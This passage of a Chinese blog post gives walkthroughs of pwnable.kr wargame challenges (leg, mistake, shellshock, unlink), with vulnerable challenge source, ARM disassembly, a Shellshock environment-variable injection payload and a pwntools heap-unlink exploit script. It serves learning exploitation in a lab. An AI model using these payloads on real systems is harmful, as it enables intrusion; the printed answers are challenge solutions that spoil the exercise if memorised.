: &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line">	if( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">		printf(&quot;Congratz!\n&quot;);</span><br><span class="line">		int fd = open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">		char buf[100];</span><br><span class="line">		int r = read(fd, buf, 100);</span><br><span class="line">		write(0, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;I have strong leg :P\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="asm">asm</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:	push	&#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:	add	r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:	sub	sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:	mov	r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:	str	r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:	ldr	r0, [pc, #104]	; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:	bl	0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:	sub	r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:	ldr	r0, [pc, #96]	; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:	mov	r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:	bl	0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:	bl	0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:	mov	r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:	bl	0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:	add	r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:	add	r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:	ldr	r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:	cmp	r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:	bne	0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:	ldr	r0, [pc, #44]	; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:	ldr	r0, [pc, #40]	; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:	bl	0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:	b	0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:	ldr	r0, [pc, #32]	; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:	mov	r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:	mov	r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:	sub	sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:	pop	&#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:	andeq	r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:	andeq	r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:	andeq	r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
<p>第一次看 ARM 汇编，去查了下资料。 首先确定 pc 寄存器和 lr
寄存器是什么 pc 寄存器（r15）是程序计数器，它很像 X86 里的 ip
寄存器，保存下一条指令的地址，严格来讲，r15（pc）总是指向“正在取指”的指令。这里下面会做说明。
lr
寄存器（r14）是连接寄存器，它保存函数调用过程中的返回地址。也就是说函数返回的时候程序就是跳转到lr存的地址。
另外，ARM 用 r0 来保存函数返回的值。</p>
<p>由此我们来分析以上代码，key1 返回 pc 的值，key2 返回 pc + 4，key3
返回 lr 的值。</p>
<p>因为对 pc 的理解不完全正确，我当时在这里卡了很久，后来翻了 ET
的博客终于发现 pc 存的其实不是接下来要执行的地址。</p>
<blockquote>
<p>PC
代表程序计数器，流水线使用三个阶段，因此指令分为三个阶段执行：1.取指（从存储器装载一条指令）；2.译码（识别将要被执行的指令）；3.执行（处理
指令并将结果写回寄存器）。而
R15（PC）总是指向“正在取指”的指令，而不是指向“正在执行”的指令或正在“译码”的指令。一般来说，人们习惯性约定
将“正在执行的指令作为参考点”，称之为当前第一条指令，因此 PC
总是指向第三条指令。当 ARM 状态时，每条指令为 4
字节长，所以PC始终指向该指令地址 加 8 字节的地址，即：PC 值 =
当前程序执行位置 + 8； ARM
指令是三级流水线，取指，译指，执行时同时执行的，现在 PC
指向的是正在取指的地址，那么 CPU 正在译指的指令地址是 PC - 4（假设在 ARM
状态 下，一个指令占 4 个字节），CPU 正在执行的指令地址是 PC -
8，也就是说 PC 所指向的地址和现在所执行的指令地址相差8。</p>
</blockquote>
<p>这里再注意一下 key2 中的 .code 这样的伪指令。 .code 16
表示下面的代码被声明为 thumb 指令集编译 .code 32 表示下面的代码被声明为
ARM 指令集编译 thumb 指令集是 16 位而 ARM 指令集是 32 位，所以在这里 PC
的值也要相应的修改。</p>
<p>综上我们可以计算出 key1（PC） = 0x00008cdc + 0x8 = 0x00008ce4</p>
<p>key2（PC + 4） = 0x00008d04 + 0x4 + 0x4 = 0x00008d0c</p>
<p>key3（lr） = 0x00008d80</p>
<p>相加得到<strong>108400</strong></p>
<p><img src="img/leg0.png" /></p>
<hr />
<h2 id="question8mistake">Question8：mistake</h2>
<blockquote>
<p>We all make mistakes, let's move on. (don't take this too seriously,
no fancy hacking skill is required at all)</p>
</blockquote>
<blockquote>
<p>This task is based on real event Thanks to dhmonkey</p>
</blockquote>
<blockquote>
<p>hint : operator priority</p>
</blockquote>
<blockquote>
<p>ssh mistake@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<hr />
<h3 id="writeup-7">Writeup：</h3>
<p>水题，先看源码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xor</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="keyword">if</span>(fd=<span class="built_in">open</span>(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">sleep</span>(<span class="built_in">time</span>(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line">	<span class="keyword">if</span>(!(len=<span class="built_in">read</span>(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// xor your input</span></span><br><span class="line">	<span class="built_in">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">close</span>(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>hint 已经说得很清楚是一个运算符优先级的问题，从头看下来在 17
行的位置就能发现问题，因为 &lt; 的执行顺序是优先于 = 的，所以这里 fd
的值应该恒为 0，后面的 read 变成从 stdin 里面读取数据。</p>
<p>所以第一次输入就是 pw_buf, 第二次输入就是 pw_buf2，中间那个 XOR
逆一下，假如以“0123456789”作为第一次输入，那个分别把 '0' ~ '9' 与 1
异或得到的就是第二次输入。
稍微注意一下这里的函数以字符串接受输入，但是照上面那个输入的话这里其实无所谓数字型或者字符串型，因为结果是一样的，pw_buf2
就是“1032547698”。 <img src="img/mistake00.png" /></p>
<hr />
<h2 id="question9shellshock">Question9：shellshock</h2>
<blockquote>
<p>Mommy, there was a shocking news about bash. I bet you already know,
but lets just make it sure :)</p>
</blockquote>
<blockquote>
<p>ssh shellshock@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<h3 id="writeup-8">Writeup:</h3>
<h3 id="prerequisite">Prerequisite:</h3>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)"
title="Wiki-Shellshock">Wiki-Shellshock</a></p>
<p>简单的说一下就是，比如你在 shell 里输入 fun(){ echo HelloWorld; };
会定义函数 fun（写在一行里面的时候记得大括号旁留空格），如果是 fun =
'(){ echo HelloWorld; };' 的话，正常的 shell
会把它当做一个变量，但是存在的漏洞的 bash 在 fun
被载入环境变量的时候会把它解释为一个函数。这样我们可以在函数体后面加上我们要执行的代码，bash
在载入环境变量的时候会执行你追加的代码。相关的实例在 <a
target="_blank" rel="noopener" href="http://blog.plusls.cn/ctf/pwnable/shellshock/"
title="plusls的博客">plusls的博客</a>里有介绍。
更深入的原理可以在这篇文章里看到: <a
target="_blank" rel="noopener" href="https://coolshell.cn/articles/11973.html"
title="https://coolshell.cn/articles/11973.html">https://coolshell.cn/articles/11973.html</a></p>
<h3 id="solution">Solution</h3>
<p>题目已经告诉你是 shellshock 漏洞那就可以直接打了。 env
指令可以直接定义环境变量，我们定义一个空的函数 fun = '(){ :; };'（:在
shell 里表示空语句），然后再这个函数后面追加要执行的代码就能拿到
shell.</p>
<p>最后构造的 payload: <strong>env fun='() { :;}; /bin/cat flag'
./shellshock</strong> 这里用 export 写环境变量也可以。 <img
src="img/shellshock00.png" /></p>
<hr />
<h2 id="question10-unlink">Question10: unlink</h2>
<blockquote>
<p>Daddy! how can I exploit unlink corruption?</p>
</blockquote>
<blockquote>
<p>ssh unlink@pwnable.kr -p2222 (pw: guest)</p>
</blockquote>
<h3 id="writeup-9">Writeup:</h3>
<h3 id="prerequisition">Prerequisition</h3>
<p><a
target="_blank" rel="noopener" href="http://wps2015.org/drops/drops/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">堆溢出中的
unlink</a> 做这个题了解一下文章中第一部分就可以</p>
<h3 id="solution-1">Solution</h3>
<p>连上去拿到一份代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagOBJ</span>&#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">tagOBJ</span>* fd;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">tagOBJ</span>* bk;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">        OBJ* BK;</span><br><span class="line">        OBJ* FD;</span><br><span class="line">        BK=P-&gt;bk;</span><br><span class="line">        FD=P-&gt;fd;</span><br><span class="line">        FD-&gt;bk=BK;</span><br><span class="line">        BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">        OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(OBJ));</span><br><span class="line">        OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(OBJ));</span><br><span class="line">        OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">        A-&gt;fd = B;</span><br><span class="line">        B-&gt;bk = A;</span><br><span class="line">        B-&gt;fd = C;</span><br><span class="line">        C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\n&quot;</span>);</span><br><span class="line">        <span class="comment">// heap overflow!</span></span><br><span class="line">        <span class="built_in">gets</span>(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// exploit this unlink!</span></span><br><span class="line">        <span class="built_in">unlink</span>(B);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个涉及到堆溢出的题目，这个题目简单还原了一个古老 unlink
场景（现代的 unlink 由于加入了新的安全检查机制，利用难度更高）。
很明显我们可以通过堆溢出来触发 unlink
获得一个<strong>有副作用的</strong>任意地址写。
最开始想到这里的时候的想法是直接把 main 函数的返回地址改到
shell，但是动手写脚本之前反应过来，这样写的话会产生一个副作用，它将会修改返回地址的同时，unlink
也会修改到 shell 函数的内容，这样就会引发异常，拿不到 shell。而程序开了
NX 保护，这样写 shellcode 也没有办法执行。
然后我在这里卡了很久，最后在网络上找到了其它选手的解法，非常的妙。</p>
<p>这里利用的main函数最后的一段代码。</p>
<p><img src="img/unlink00.png" /></p>
<p>可以看到在 retn 之前有针对 esp 的几个操作，而 retn 其实就是 pop
eip，只要我们能控制最后 esp 里的东西，我们就能控制程序的执行流程。esp
最后是取决于 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ecx, [ebp-4]</span><br><span class="line">lea esp, [ecx-4]</span><br></pre></td></tr></table></figure> 中间那个 leave 命令对最终 esp
没什么影响，这样分析的话 esp 其实就取决于 ebp-4
这个地方的值，也就是说，我们只要把 shell 函数的地址写在某个地方，称之为
shellAddr，然后把 shellAddr+4 写到 ebp-4 这个位置去，这样就可以让 main
在 retn 过后跳到 shell 函数去。</p>
<p>由于给出了栈地址和堆地址，假设我把 shellAddr 写在 A-&gt;buf
的开头，那 shellAddr+4 就等于 A+12，而 ebp
这个看一下栈空间的结构也不难推出来，最后 payload 的结构就是
<code>shellAddr + padding + (shellAddr+4) + (ebp-4)</code></p>
<p>最后的脚本如下 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x080484eb</span></span><br><span class="line">pwn_ssh = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;unlink&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">p = pwn_ssh.process(executable=<span class="string">&quot;./unlink&quot;</span>)</span><br><span class="line">line1=p.readline().strip()</span><br><span class="line">line2=p.readline().strip()</span><br><span class="line">stack_addr = <span class="built_in">int</span>(line1.split(<span class="string">&#x27;: 0x&#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(line2.split(<span class="string">&#x27;: 0x&#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(shell_addr) + <span class="number">12</span>*<span class="string">&#x27;a&#x27;</span> + p32(heap_addr + <span class="number">0xc</span>) + p32(stack_addr + <span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2017-1st-step-of-wordpress/" rel="prev" title="在云服务器搭一个 WordPress 站点">
                  <i class="fa fa-angle-left"></i> 在云服务器搭一个 WordPress 站点
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2017-ccpp-coursework/" rel="next" title="Touhou 开发手记">
                  Touhou 开发手记 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2017 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-keyboard"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Kyr1os</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/kyrios0" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
